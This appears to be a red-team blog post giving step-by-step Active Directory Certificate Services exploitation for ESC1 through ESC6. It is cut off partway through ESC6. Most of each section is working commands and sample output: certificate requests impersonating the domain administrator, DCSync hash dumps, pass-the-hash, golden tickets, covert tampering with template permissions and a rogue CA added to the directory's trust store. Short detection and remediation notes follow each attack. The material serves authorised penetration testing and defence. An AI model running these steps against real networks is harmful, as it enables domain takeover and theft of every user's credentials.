---
title: "ADCS Attacks Deep Dive: ESC1–ESC11 Complete Exploitation Guide"
date: 2026-03-28 13:20:00 +0200
categories: [Security, Active Directory]
tags: [adcs, active-directory, red-team, pentest, esc1, esc2, esc3, esc4, esc5, esc6, esc7, esc8, esc9, esc10, esc11, certificates, pki, domain-controller, exploit]
---

> **⚠️ Disclaimer:** This content is strictly for authorized penetration testing, red team operations, and educational purposes. All techniques must only be used in environments you own or have explicit written permission to test.

---

## Lab Environment Reference

Throughout this guide, we use the following lab setup:

```
Network: 192.168.10.0/24

Domain: corp.local
Domain Controller:  DC01   192.168.10.10  (Windows Server 2022)
CA Server:          CA01   192.168.10.20  (Windows Server 2022 + ADCS)
Member Server:      SRV01  192.168.10.30  (Windows Server 2019)
Attacker Machine:   KALI   192.168.10.99  (Kali Linux 2024)
Victim Workstation: WS01   192.168.10.50  (Windows 10)

Domain Accounts:
  administrator@corp.local  → Domain Admin
  lowpriv@corp.local        → Domain User (password: Password123!)
  victimuser@corp.local     → Domain User (password: Summer2024!)
  svcaccount@corp.local     → Service Account
  pkiadmin@corp.local       → PKI Admin (has ManageCA)

CA Name: Corp-CA
CA FQDN: ca01.corp.local\Corp-CA
```

---

## Part 0 — Understanding ADCS from the Ground Up

### What is ADCS and Why Should You Care?

Active Directory Certificate Services (ADCS) is Microsoft's implementation of a **Public Key Infrastructure (PKI)**. It's baked into Windows Server and used in virtually every enterprise environment running Active Directory.

At its core, ADCS does one thing: **it issues digital certificates**. Those certificates are then used to:

- Prove identity (authentication)
- Encrypt data (EFS, TLS, VPN)
- Sign code and emails
- Enable smart card login

Sounds boring. But here's the attack surface: **AD trusts certificates completely and implicitly**. When Kerberos sees a certificate issued by a trusted CA, it accepts it as proof of identity — no questions asked. No password. No MFA challenge. Just a certificate.

This means:
- A certificate claiming to be `administrator@corp.local` → get a Kerberos TGT as Domain Admin
- That certificate is valid for **1–2 years by default**
- Even if the admin resets their password, the certificate still works
- ADCS is almost never monitored properly

### How Certificate Authentication Works (PKINIT)

```
[Attacker with Admin Certificate]
         │
         │  AS-REQ with Certificate (PKINIT)
         ▼
  [Domain Controller 192.168.10.10]
         │
         │  Validates: Is cert issued by trusted CA? → Yes (Corp-CA)
         │  Extracts:  UPN from SAN → administrator@corp.local
         │  Ignores:   Who actually requested the cert
         │
         │  AS-REP with TGT
         ▼
[Attacker now has TGT for administrator]
         │
         ▼
[DCSync → All domain hashes → Complete compromise]
```

### Certificate Template Anatomy

Every certificate is based on a **template**. Templates define:

| Property | Description | Attack Relevance |
|----------|-------------|-----------------|
| `msPKI-Certificate-Name-Flag` | Controls SAN/subject | ESC1: `EnrolleeSuppliesSubject` |
| `msPKI-Enrollment-Flag` | Enrollment settings | Manager approval bypass |
| `pKIExtendedKeyUsage` | What the cert can do | Must include Client Auth |
| `nTSecurityDescriptor` | Who can enroll | Must allow low-priv users |
| `msPKI-RA-Signature` | Enrollment agent requirements | ESC3 |
| `msPKI-Private-Key-Flag` | Key archival settings | ESC9 |

### The Certificate Request Flow

```
1. Client generates keypair (public + private)
2. Client creates CSR (Certificate Signing Request)
   └── Can include requested SAN, subject, etc.
3. Client sends CSR to CA (via RPC, HTTP, or DCOM)
4. CA checks:
   a. Does requester have Enroll permission on template?
   b. Does template require manager approval?
   c. Does CA have EDITF_ATTRIBUTESUBJECTALTNAME2 set?
5. CA signs and issues certificate
6. Client stores certificate + private key
```

### Tools We'll Use

```bash
# ─── LINUX (Kali 192.168.10.99) ─────────────────────────────

# Certipy — primary ADCS attack tool
pip install certipy-ad
certipy --version   # Should show 4.x+

# Impacket suite
pip install impacket
# Key scripts: secretsdump.py, ntlmrelayx.py, getST.py

# PetitPotam — coercion tool
git clone https://github.com/topotam/PetitPotam.git
cd PetitPotam && pip install -r requirements.txt

# Coercer — all coercion techniques in one
pip install coercer

# ─── WINDOWS (attacker workstation or foothold) ─────────────

# Certify.exe — enumerate templates
# Download: https://github.com/GhostPack/Certify/releases

# Rubeus.exe — Kerberos manipulation
# Download: https://github.com/GhostPack/Rubeus/releases

# Whisker — Shadow Credentials
# Download: https://github.com/eladshamir/Whisker/releases
```

---

## ESC1 — Enrollee Supplies Subject (SAN Abuse)

### Root Cause of Vulnerability

The core issue is a **template configuration flag** called `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` stored in the `msPKI-Certificate-Name-Flag` attribute of the template object in Active Directory.

When this flag is set, the CA allows the certificate requester to include any Subject Alternative Name (SAN) they want in their certificate request. The CA does **zero validation** of whether the SAN identity actually belongs to the requester. It simply trusts what the client sends.

Combined with the fact that:
1. Active Directory uses the SAN (specifically the UPN in the SAN) to determine certificate-to-identity mapping for authentication
2. Any certificate from a trusted CA is accepted for Kerberos PKINIT

...this means anyone with enrollment rights can impersonate any user in the domain, including Domain Admins.

The flag was designed for web server certificates where admins legitimately need to specify custom hostnames. The problem is when the template also includes authentication EKUs.

### Vulnerable Template Configuration

A template is vulnerable when ALL of these are true:

```
msPKI-Certificate-Name-Flag    = CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x1)
msPKI-Enrollment-Flag          = NOT CT_FLAG_PEND_ALL_REQUESTS (no manager approval)
pKIExtendedKeyUsage            = contains Client Authentication (1.3.6.1.5.5.7.3.2)
                                   OR Smart Card Logon (1.3.6.1.4.1.311.20.2.2)
                                   OR PKINIT Client Auth
                                   OR Any Purpose (2.5.29.37.0)
nTSecurityDescriptor           = Enroll or AutoEnroll for Domain Users / Authenticated Users
```

### Step-by-Step Exploitation

#### Step 1: Enumerate Vulnerable Templates

```bash
# From Kali (192.168.10.99) as lowpriv user
certipy find \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -dc-ip 192.168.10.10 \
  -vulnerable \
  -stdout

# Sample output showing ESC1:
# Certificate Templates
#   Template Name              : VulnWebTemplate
#   Display Name               : Vulnerable Web Template
#   Certificate Authorities    : Corp-CA
#   Enabled                    : True
#   Client Authentication      : True        ← Auth EKU present
#   Enrollment Agent           : False
#   Any Purpose                : False
#   Enrollee Supplies Subject  : True         ← THE VULNERABLE FLAG
#   Certificate Name Flags     : EnrolleeSuppliesSubject
#   Enrollment Flags           : None
#   Extended Key Usage         : Client Authentication
#   Requires Manager Approval  : False        ← No approval needed
#   Permissions
#     Enrollment Permissions
#       Enrollment Rights      : CORP.LOCAL\Domain Users    ← Any user!
```

```powershell
# Alternatively from Windows foothold
.\Certify.exe find /vulnerable

# [!] Vulnerable Certificates Templates :
#     CA Name           : ca01.corp.local\Corp-CA
#     Template Name     : VulnWebTemplate
#     Schema Version    : 2
#     Validity Period   : 1 year
#     Renewal Period    : 6 weeks
#     msPKI-Certificates-Name-Flag    : ENROLLEE_SUPPLIES_SUBJECT
#     mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS PUBLISH_TO_DS
#     Authorized Signatures Required  : 0
#     Application Policies            :
#     pkiextendedkeyusage             : Client Authentication
#     mspki-certificate-application-policy : Client Authentication
#     Permissions
#       Enrollment Permissions
#         Enrollment Rights           : CORP\Domain Users     S-1-5-21-...
#       Object Control Permissions
#         Owner                       : CORP\Administrator    S-1-5-21-...
#         WriteOwner Principals       : CORP\Administrator    S-1-5-21-...
#         WriteDacl Principals        : CORP\Administrator    S-1-5-21-...
#         WriteProperty Principals    : CORP\Administrator    S-1-5-21-...
```

#### Step 2: Request Certificate with Admin SAN

```bash
# From Kali — request a certificate claiming to be administrator
certipy req \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -template 'VulnWebTemplate' \
  -upn 'administrator@corp.local' \
  -target ca01.corp.local \
  -dc-ip 192.168.10.10

# Output:
# [*] Requesting certificate via RPC
# [*] Successfully requested certificate
# [*] Request ID is 23
# [*] Got certificate with UPN 'administrator@corp.local'
# [*] Certificate object SID is 'S-1-5-21-...-500'
# [*] Saved certificate and private key to 'administrator.pfx'
```

```powershell
# Windows — Certify
.\Certify.exe request /ca:ca01.corp.local\Corp-CA /template:VulnWebTemplate /altname:administrator

# [*] Action: Request a Certificates
# [*] Current user context    : CORP\lowpriv
# [*] No subject name specified, using current context as subject.
# [*] Template                : VulnWebTemplate
# [*] Subject                 : CN=lowpriv, CN=Users, DC=corp, DC=local
# [*] AltName                 : administrator
# [*] Certificate Authority   : ca01.corp.local\Corp-CA
# [*] CA Response             : The certificate had been issued.
# [*] Request ID              : 23
# [*] cert.pem                :
# -----BEGIN RSA PRIVATE KEY-----
# ...
# -----END CERTIFICATE-----

# Convert PEM to PFX (run on Kali or use openssl on Windows)
openssl pkcs12 \
  -in cert.pem \
  -keyex \
  -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
  -export \
  -out admin.pfx \
  -passout pass:''
```

#### Step 3: Authenticate and Get NTLM Hash (Linux)

```bash
# Use certificate for PKINIT — get TGT and NTLM hash
certipy auth \
  -pfx administrator.pfx \
  -dc-ip 192.168.10.10

# Output:
# [*] Using principal: administrator@corp.local
# [*] Trying to get TGT...
# [*] Got TGT
# [*] Saved credential cache to 'administrator.ccache'
# [*] Trying to retrieve NT hash for 'administrator'
# [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
```

#### Step 4: Use Hash for Full Domain Compromise

```bash
# Option A: DCSync — dump all domain hashes
python3 secretsdump.py \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71' \
  'corp.local/administrator@192.168.10.10'

# Output:
# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:19e9b6b62bd6e15f3a5bcf1c6f3e4d2a:::
# ...all user hashes...

# Option B: Pass-the-Hash to DC
python3 wmiexec.py \
  -hashes ':58a478135a93ac3bf058a5ea0e8fdb71' \
  'corp.local/administrator@192.168.10.10'

# Option C: Golden Ticket using krbtgt hash
python3 ticketer.py \
  -nthash 19e9b6b62bd6e15f3a5bcf1c6f3e4d2a \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain corp.local \
  administrator

export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass corp.local/administrator@dc01.corp.local
```

#### Step 5: Pass-the-Certificate (Windows)

```powershell
# On Windows foothold — inject TGT directly
.\Rubeus.exe asktgt \
  /user:administrator \
  /certificate:admin.pfx \
  /password:'' \
  /domain:corp.local \
  /dc:192.168.10.10 \
  /ptt

# [*] Action: Ask TGT
# [*] Using PKINIT with etype rc4_hmac and subject: CN=lowpriv
# [*] Building AS-REQ (w/ PKINIT preauth) for: 'corp.local\administrator'
# [+] TGT request successful!
# [*] base64(ticket.kirbi):
#      doIFuj ... [base64 TGT]
# [+] Ticket successfully imported!

# Now we have admin TGT in memory
klist

# Access DC
dir \\dc01.corp.local\c$
# Volume in drive \\dc01.corp.local\c$ is ...

# Run commands on DC
.\PsExec.exe \\dc01.corp.local cmd
```

### Detection Indicators

- **Event ID 4886** on CA01: Certificate request received — SAN contains a different user than the requester
- **Event ID 4887** on CA01: Certificate issued — cross-reference `Requester` vs SAN UPN
- **Event ID 4768** on DC01: TGT request using PKINIT from unexpected user
- Unusual PKINIT auth (most users use password auth, not certificates)
- Certificate Subject ≠ Certificate SAN

### Remediation Steps

```powershell
# On CA01 — Disable EnrolleeSuppliesSubject on the template
# Open Certificate Templates console: certtmpl.msc
# Right-click VulnWebTemplate → Properties → Subject Name tab
# Change "Supply in the request" to "Build from Active Directory"

# Or via PowerShell/ADSI
$template = [ADSI]"LDAP://CN=VulnWebTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
# Get current flags
$flags = $template.Properties["msPKI-Certificate-Name-Flag"].Value
# Remove bit 1 (EnrolleeSuppliesSubject = 0x1)
$newflags = $flags -band (-bnot 0x1)
$template.Properties["msPKI-Certificate-Name-Flag"].Value = $newflags
$template.CommitChanges()

# If SAN is legitimately needed, enable Manager Approval:
# certtmpl.msc → Template Properties → Issuance Requirements → CA certificate manager approval
```

---

## ESC2 — Any Purpose / No EKU

### Root Cause of Vulnerability

The `Extended Key Usage` (EKU) field in a certificate restricts what the certificate can be used for. Common EKUs include:

- `1.3.6.1.5.5.7.3.1` — Server Authentication
- `1.3.6.1.5.5.7.3.2` — Client Authentication
- `1.3.6.1.5.5.7.3.3` — Code Signing
- `2.5.29.37.0`        — **Any Purpose** (no restriction)

When a template has **no EKU** (empty field) or **Any Purpose**, the resulting certificate is treated by Windows as:
1. Valid for **client authentication** — can be used for PKINIT/Kerberos even without Client Auth EKU
2. Valid as an **enrollment agent** certificate — can be used to request certs on behalf of others (ESC3 pivot)
3. Valid as a **subordinate CA** certificate — can sign other certificates

This is because Windows follows X.509 standard: absence of EKU = unrestricted use.

### Step-by-Step Exploitation

#### Step 1: Identify Any Purpose / No EKU Templates

```bash
certipy find \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -dc-ip 192.168.10.10 \
  -vulnerable \
  -stdout

# Look for:
#   Any Purpose           : True
# OR
#   Extended Key Usage    : (empty / none listed)
#   Application Policies  : (empty)
```

#### Step 2: Request the Certificate

```bash
# Request the Any Purpose cert as yourself
certipy req \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -template 'AnyPurposeTemplate' \
  -dc-ip 192.168.10.10

# Saved to: lowpriv.pfx
```

#### Step 3a: Use for Direct Authentication

```bash
# Even though Client Authentication is not listed, Any Purpose allows it
certipy auth \
  -pfx lowpriv.pfx \
  -dc-ip 192.168.10.10 \
  -username lowpriv \
  -domain corp.local

# This gives you TGT + hash for lowpriv — useful for persistence
```

#### Step 3b: Pivot to ESC3 — Use as Enrollment Agent

```bash
# Use the Any Purpose cert as enrollment agent
# Request a cert ON BEHALF OF administrator
certipy req \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -template 'User' \
  -on-behalf-of 'corp\administrator' \
  -pfx lowpriv.pfx \
  -dc-ip 192.168.10.10

# Output: administrator.pfx

certipy auth -pfx administrator.pfx -dc-ip 192.168.10.10
# → NT hash for administrator → DCSync
```

#### Step 3c: Use as Rogue Sub-CA (No EKU only)

```bash
# If template has no EKU, the cert can act as SubCA
# Forge a certificate signed by our Any Purpose cert

# Generate target cert
openssl req -newkey rsa:2048 -keyout admin_forged.key -out admin_forged.csr -nodes \
  -subj "/CN=administrator"

# Sign it with our Any Purpose cert (acting as sub-CA)
openssl x509 -req -in admin_forged.csr \
  -CA lowpriv.crt -CAkey lowpriv.key \
  -CAcreateserial -out admin_forged.crt -days 365 \
  -extfile <(printf "[ext]\nsubjectAltName=otherName:1.3.6.1.4.1.311.20.2.3;UTF8:administrator@corp.local")

# Combine into PFX
openssl pkcs12 -export -in admin_forged.crt -inkey admin_forged.key -out forged_admin.pfx -passout pass:''
```

### Detection & Remediation

```powershell
# Detection: Audit templates with Any Purpose or no EKU
Get-CATemplate | Where-Object { $_.pKIExtendedKeyUsage -eq $null -or $_.pKIExtendedKeyUsage -contains "2.5.29.37.0" }

# Remediation: Remove Any Purpose EKU, specify only what's needed
# certtmpl.msc → Template → Extensions → Application Policies
# Remove "Any Purpose", add specific required EKUs only
```

---

## ESC3 — Enrollment Agent Certificate Abuse

### Root Cause of Vulnerability

The **Certificate Request Agent** functionality allows designated users (enrollment agents) to request certificates **on behalf of** other users. This is a legitimate feature used by helpdesk staff to issue smart cards for users.

The EKU that grants this power is: `1.3.6.1.4.1.311.20.2.1` (Certificate Request Agent)

**Two conditions** must exist simultaneously:
1. **ESC3-1**: A template exists that grants low-privileged users the Certificate Request Agent EKU (enrollment agent cert)
2. **ESC3-2**: Another template exists with Client Authentication EKU where enrollment agents aren't restricted to specific principals

When both exist, the attack chain is: get enrollment agent cert → use it to request User template cert for Domain Admin → authenticate as DA.

The CA has a feature called **Enrollment Agent Restrictions** that limits which templates enrollment agents can use and which subjects they can request on behalf of. When this is not configured, enrollment agents have no restrictions.

### Step-by-Step Exploitation

#### Step 1: Find Enrollment Agent Templates (ESC3-1)

```bash
certipy find \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -dc-ip 192.168.10.10 \
  -vulnerable

# Look for:
#   Enrollment Agent      : True
#   Requires Manager Approval : False
#   Enrollment Rights     : Domain Users
```

#### Step 2: Obtain Enrollment Agent Certificate

```bash
certipy req \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -template 'EnrollmentAgentTemplate' \
  -dc-ip 192.168.10.10

# Output:
# [*] Requesting certificate via RPC
# [*] Successfully requested certificate
# [*] Got certificate with EKU 'Certificate Request Agent'
# [*] Saved certificate and private key to 'lowpriv.pfx'
```

#### Step 3: Find Eligible "Victim" Templates (ESC3-2)

```bash
# Look for templates where:
# - Client Authentication EKU is present
# - Enrollment agent can enroll (no RA application policy restriction)
# Typically the built-in "User" template works

certipy find \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -dc-ip 192.168.10.10 \
  -stdout | grep -A 20 "Template Name.*: User"
```

#### Step 4: Request Certificate On Behalf Of Domain Admin

```bash
# Use enrollment agent cert to request a User cert for administrator
certipy req \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -template 'User' \
  -on-behalf-of 'corp\administrator' \
  -pfx lowpriv.pfx \
  -dc-ip 192.168.10.10

# Output:
# [*] Requesting certificate via RPC (on behalf of 'corp\administrator')
# [*] Successfully requested certificate
# [*] Got certificate with UPN 'administrator@corp.local'
# [*] Saved certificate and private key to 'administrator.pfx'
```

#### Step 5: Authenticate as Administrator

```bash
certipy auth \
  -pfx administrator.pfx \
  -dc-ip 192.168.10.10

# [*] Got hash for 'administrator@corp.local': aad3b435...:58a478135a93ac3bf058a5ea0e8fdb71
```

```bash
# DCSync
python3 secretsdump.py \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71' \
  'corp.local/administrator@192.168.10.10'
```

#### Step 6: Escalate to Other Users Too

```bash
# Can now request certs for ANY user — krbtgt, other DAs, service accounts
certipy req \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -template 'User' \
  -on-behalf-of 'corp\krbtgt' \
  -pfx lowpriv.pfx \
  -dc-ip 192.168.10.10

# Get krbtgt hash → create Golden Tickets
certipy auth -pfx krbtgt.pfx -dc-ip 192.168.10.10 -username krbtgt -domain corp.local
```

### Detection & Remediation

```
Detection:
  Event ID 4887: Certificate issued — check if "Requester" ≠ "Subject"
  Look for on-behalf-of requests in CA audit logs
  Unusual users holding Certificate Request Agent EKU certs

Remediation:
  1. On CA01: Configure Enrollment Agent Restrictions
     certmgmt.msc → Corp-CA → Properties → Enrollment Agents
     Add specific helpdesk accounts only; restrict templates to non-auth templates
  
  2. Restrict Certificate Request Agent template enrollment to dedicated helpdesk OUs
  
  3. Enable Manager Approval on the enrollment agent template
```

---

## ESC4 — Writable Certificate Template ACL

### Root Cause of Vulnerability

Certificate templates are **Active Directory objects** stored in:
```
CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
```

Like all AD objects, templates have Access Control Lists (ACLs). If a low-privileged user has **write permissions** on a template's ACL, they can modify the template's dangerous attributes to introduce ESC1 conditions — then exploit it, then (optionally) restore it.

The dangerous write permissions are:
- `GenericAll` — full control
- `GenericWrite` — write any property
- `WriteOwner` — change owner → gain GenericAll
- `WriteDacl` — change ACL → grant yourself GenericAll
- `WriteProperty` on specific attributes like `msPKI-Certificate-Name-Flag`

This vulnerability is particularly stealthy because template ACL changes are rarely monitored, and the attack can be done, exploited, and reversed in under 60 seconds.

### Step-by-Step Exploitation

#### Step 1: Identify Templates with Weak ACLs

```bash
certipy find \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -dc-ip 192.168.10.10 \
  -vulnerable

# Look for under "Object Control Permissions":
#   Write Owner Principals    : CORP\Domain Users   ← BAD
#   Write Dacl Principals     : CORP\Domain Users   ← BAD
#   Write Property Principals : CORP\Domain Users   ← BAD
```

```powershell
# Windows — use PowerView to check ACLs on templates
Import-Module .\PowerView.ps1

Get-DomainObjectAcl -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -ResolveGUIDs | 
  Where-Object { 
    $_.ActiveDirectoryRights -match "Write|GenericAll" -and 
    $_.SecurityIdentifier -match "S-1-5-21-.*-513"  # Domain Users SID
  }
```

#### Step 2: Modify Template to Enable ESC1

```bash
# Certipy can automatically modify the template, exploit, and optionally restore
# First, save the original configuration
certipy template \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -template 'WritableTemplate' \
  -save-old \
  -dc-ip 192.168.10.10

# This creates: WritableTemplate.json (backup)
# And modifies the template to:
#   - Enable EnrolleeSuppliesSubject flag
#   - Remove manager approval requirement  
#   - Add Client Authentication EKU
#   - Allow Domain Users to enroll

# Certipy output:
# [*] Updating certificate template 'WritableTemplate'
# [*] Successfully updated 'WritableTemplate'
```

```powershell
# Manual method using ADSI — more surgical
$templateDN = "LDAP://CN=WritableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
$template = [ADSI]$templateDN

# Enable EnrolleeSuppliesSubject (bit 0x1)
$current = $template.Properties["msPKI-Certificate-Name-Flag"].Value
$template.Properties["msPKI-Certificate-Name-Flag"].Value = $current -bor 0x1
$template.CommitChanges()

# Remove manager approval (remove PEND_ALL_REQUESTS bit 0x2)
$enrollFlags = $template.Properties["msPKI-Enrollment-Flag"].Value  
$template.Properties["msPKI-Enrollment-Flag"].Value = $enrollFlags -band (-bnot 0x2)
$template.CommitChanges()

# Add Client Authentication EKU
$template.Properties["pKIExtendedKeyUsage"].Add("1.3.6.1.5.5.7.3.2")
$template.CommitChanges()

Write-Host "Template modified! Now exploit it..."
```

#### Step 3: Exploit the Now-Vulnerable Template (ESC1)

```bash
certipy req \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -ca 'Corp-CA' \
  -template 'WritableTemplate' \
  -upn 'administrator@corp.local' \
  -dc-ip 192.168.10.10

# [*] Got certificate with UPN 'administrator@corp.local'
# [*] Saved certificate and private key to 'administrator.pfx'
```

#### Step 4: Authenticate

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.10.10
# Hash: aad3b435...:58a478135a93ac3bf058a5ea0e8fdb71
```

#### Step 5: Restore Template (Stealth)

```bash
# Restore original template configuration to avoid detection
certipy template \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -template 'WritableTemplate' \
  -configuration WritableTemplate.json \
  -dc-ip 192.168.10.10

# [*] Successfully restored 'WritableTemplate'
# Template looks normal again
```

### Detection & Remediation

```
Detection:
  Event ID 5136 (Directory Service Object Modified) on DC01
  Filter on: Object Class = pKICertificateTemplate
  Specifically watch: msPKI-Certificate-Name-Flag modifications
  Baseline all template attributes; alert on deviations
  
Remediation:
  1. Audit ACLs: only Enterprise Admins / Domain Admins → write on templates
  
  # PowerShell — fix ACL
  $templateDN = "CN=WritableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
  $acl = Get-Acl "AD:$templateDN"
  # Remove Domain Users write access
  $acl.Access | Where-Object { $_.IdentityReference -like "*Domain Users*" -and $_.ActiveDirectoryRights -match "Write" } | 
    ForEach-Object { $acl.RemoveAccessRule($_) }
  Set-Acl "AD:$templateDN" $acl
```

---

## ESC5 — Vulnerable PKI Object Access Control

### Root Cause of Vulnerability

Beyond certificate templates, there are other critical ADCS-related objects in AD. If an attacker can write to these, they can compromise the entire PKI regardless of how secure the templates are:

**`CN=NTAuthCertificates`** — Contains the list of CA certificates that AD trusts for authentication. Any CA cert in this store is completely trusted for PKINIT. Adding a rogue CA here means forged certificates will be accepted.

**`CN=Enrollment Services`** — Contains CA objects. Write access lets you modify CA properties, enrollment policies, or take over the CA object.

**CA computer object** — Write access to the computer object of CA01 can lead to Shadow Credentials, RBCD, or other computer takeover attacks, then CA compromise.

**`CN=AIA` / `CN=CDP`** — CRL Distribution Points. Write access could allow MITM of revocation checking.

### Step-by-Step Exploitation — NTAuthCertificates Attack

#### Step 1: Check Write Access to NTAuthCertificates

```bash
certipy find \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -dc-ip 192.168.10.10 \
  -stdout

# Look for NTAuthCertificates object control permissions

# Or use PowerView
Import-Module .\PowerView.ps1
Get-DomainObjectAcl -Identity "NTAuthCertificates" -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match "Write|GenericAll" }
```

#### Step 2: Generate a Rogue CA Certificate

```bash
# On Kali (192.168.10.99)
# Create a self-signed CA certificate
openssl req -x509 \
  -newkey rsa:4096 \
  -keyout rogueCA.key \
  -out rogueCA.crt \
  -days 3650 \
  -nodes \
  -subj "/CN=Corp-CA/DC=corp/DC=local" \
  -extensions v3_ca \
  -config <(cat /etc/ssl/openssl.cnf; echo "[v3_ca]"; echo "basicConstraints=critical,CA:TRUE"; echo "keyUsage=critical,keyCertSign,cRLSign")

# Verify
openssl x509 -in rogueCA.crt -text -noout | grep -A 5 "Basic Constraints"
# Should show: CA:TRUE
```

#### Step 3: Add Rogue CA to NTAuthCertificates

```powershell
# On Windows with write access to NTAuthCertificates
# Option A: certutil (if you have rights on the CA server)
certutil -dspublish -f rogueCA.crt NTAuthCA

# Option B: Direct LDAP modification
$ntauth = [ADSI]"LDAP://CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
$certBytes = [System.IO.File]::ReadAllBytes("C:\rogueCA.crt")
$ntauth.Properties["cACertificate"].Add($certBytes)
$ntauth.CommitChanges()
Write-Host "Rogue CA added to NTAuthCertificates!"
```

```bash
# Linux via ldapmodify
# First export cert to DER
openssl x509 -in rogueCA.crt -outform DER -out rogueCA.der

# Use ldapmodify
python3 - <<'PYEOF'
import ldap3
import base64

cert_der = open('rogueCA.der', 'rb').read()

server = ldap3.Server('192.168.10.10', get_info=ldap3.ALL)
conn = ldap3.Connection(server, 
    user='corp\\lowpriv', 
    password='Password123!',
    authentication=ldap3.NTLM)
conn.bind()

ntauth_dn = "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
conn.modify(ntauth_dn, {'cACertificate': [(ldap3.MODIFY_ADD, [cert_der])]})
print(conn.result)
PYEOF
```

#### Step 4: Create Forged Certificate Signed by Rogue CA

```bash
# Create cert for administrator, signed by our rogue CA
# This cert will be trusted by AD since our CA is now in NTAuthCertificates

# Generate key and CSR for administrator
openssl req -newkey rsa:2048 \
  -keyout admin_key.pem \
  -out admin_csr.pem \
  -nodes \
  -subj "/CN=administrator"

# Create SAN extension config
cat > san_ext.cnf << 'EOF'
[req]
req_extensions = v3_req
[v3_req]
subjectAltName = @alt_names
[alt_names]
otherName.1 = 1.3.6.1.4.1.311.20.2.3;UTF8:administrator@corp.local
EOF

# Sign CSR with rogue CA
openssl x509 -req \
  -in admin_csr.pem \
  -CA rogueCA.crt \
  -CAkey rogueCA.key \
  -CAcreateserial \
  -out admin_forged.crt \
  -days 365 \
  -extfile san_ext.cnf \
  -extensions v3_req

# Combine to PFX
openssl pkcs12 -export \
  -in admin_forged.crt \
  -inkey admin_key.pem \
  -certfile rogueCA.crt \
  -out admin_forged.pfx \
  -passout pass:''
```

#### Step 5: Authenticate with Forged Certificate

```bash
certipy auth \
  -pfx admin_forged.pfx \
  -dc-ip 192.168.10.10 \
  -username administrator \
  -domain corp.local

# DC checks: Is this cert signed by a CA in NTAuthCertificates? → Yes (our rogue CA)
# DC extracts: UPN = administrator@corp.local
# DC issues TGT as administrator
# [*] Got hash for 'administrator@corp.local': aad3b435...:58a478135a93ac3bf058a5ea0e8fdb71
```

### Detection & Remediation

```
Detection:
  Monitor modifications to CN=NTAuthCertificates (Event ID 5136)
  Regularly audit contents: certutil -viewdelstore "ldap:///CN=NTAuthCertificates,..."
  Alert on new CA certificates being added
  
Remediation:
  Remove write access to NTAuthCertificates for all non-Enterprise Admin accounts
  Implement alerting on this object's modification
  Regularly review which CA certs are trusted
```

---

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 CA Flag

### Root Cause of Vulnerability

This is a **CA-level configuration flag** stored in the registry of CA01:
```
HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\Corp-CA\PolicyModules\
  CertificateAuthority_MicrosoftDefault.Policy\EditFlags
```

The flag `EDITF_ATTRIBUTESUBJECTALTNAME2` (value `0x00040000` = 262144) tells the CA: **"Accept Subject Alternative Names from any certificate request, for any template."**

When set, this overrides the template-level `EnrolleeSuppliesSubject` flag. Even templates that are perfectly configured to NOT allow SAN specification will accept attacker-supplied SANs.

This flag was originally a Microsoft troubleshooting step for certain VPN/RADIUS scenarios. Many admins set it following Microsoft KB articles without understanding the security implications.

**Impact:** Every single template on the CA that has Client Authentication EKU and allows low-privileged enrollment becomes an ESC1 template — even ones with seemingly secure configurations.

### Step-by-Step Exploitation

#### Step 1: Verify the Flag is Set

```bash
# From Kali
certipy find \
  -u lowpriv@corp.local \
  -p 'Password123!' \
  -dc-ip 192.168.10.10 \
  -stdout | grep -A 5 "Certificate Authorities"

# Look for:
#   User Specified SAN    : Enabled   ← THIS IS THE FLAG
#   CA Name               : corp-ca
```

```powershell
# On CA01 or via remote registry
certutil -config "ca01.corp.local\Corp-CA" -getreg policy\EditFlags

# Output:
